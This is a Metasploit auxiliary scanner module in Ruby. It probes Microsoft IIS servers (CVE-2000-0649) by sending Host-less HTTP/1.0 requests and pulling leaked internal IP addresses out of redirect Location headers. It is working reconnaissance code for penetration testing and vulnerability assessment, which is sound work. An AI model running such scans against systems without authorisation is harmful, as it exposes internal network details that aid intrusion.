##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft IIS HTTP Internal IP Disclosure',
        'Description' => %q{
          Collect any leaked internal IPs by requesting commonly redirected locations from IIS.
          CVE-2000-0649 references IIS 5.1 (win2k, XP) and older.  However, in newer servers
          such as IIS 7+, this occurs when the alternateHostName is not set or misconfigured.
        },
        'Author' => ['Heather Pilkington'],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['CVE', '2000-0649'],
            ['BID', '1499'],
            ['EDB', '20096'],
            ['URL', 'https://support.microsoft.com/en-us/help/218180/internet-information-server-returns-ip-address-in-http-header-content'], # iis 4,5,5.1
            ['URL', 'https://support.microsoft.com/en-us/help/967342/fix-the-internal-ip-address-of-an-iis-7-0-server-is-revealed-if-an-htt'], # iis 7+
            ['URL', 'https://techcommunity.microsoft.com/t5/iis-support-blog/iis-web-servers-running-in-windows-azure-may-reveal-their/ba-p/826500']
          ]
      )
    )
  end

  def run_host(target_host)
    uris = ['/', '/images', '/default.htm']

    uris.each do |uri|
      # Must use send_recv() in order to send a HTTP request without the 'Host' header
      request = "GET #{uri} HTTP/1.0"
      vhost_status = datastore['VHOST'].blank? ? '' : " against #{vhost}"
      vprint_status("#{peer} - Requesting #{request}#{vhost_status}")
      c = connect
      res = c.send_recv("#{request}\r\n\r\n", 25)

      if res.nil?
        print_error("no response for #{target_host}")

      elsif ((res.code > 300) && (res.code < 310))
        intipregex = /(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/i
        print_good("Location Header: #{res.headers['Location']}")
        result = res.headers['Location'].scan(intipregex).uniq.flatten

        if !result.empty?
          print_good("Result for #{target_host} found Internal IP:  #{result.first}")
        end

        report_note({
          host: target_host,
          port: rport,
          proto: 'tcp',
          sname: (ssl ? 'https' : 'http'),
          type: 'iis.ip',
          data: result.first
        })
      end
    end
  end
end
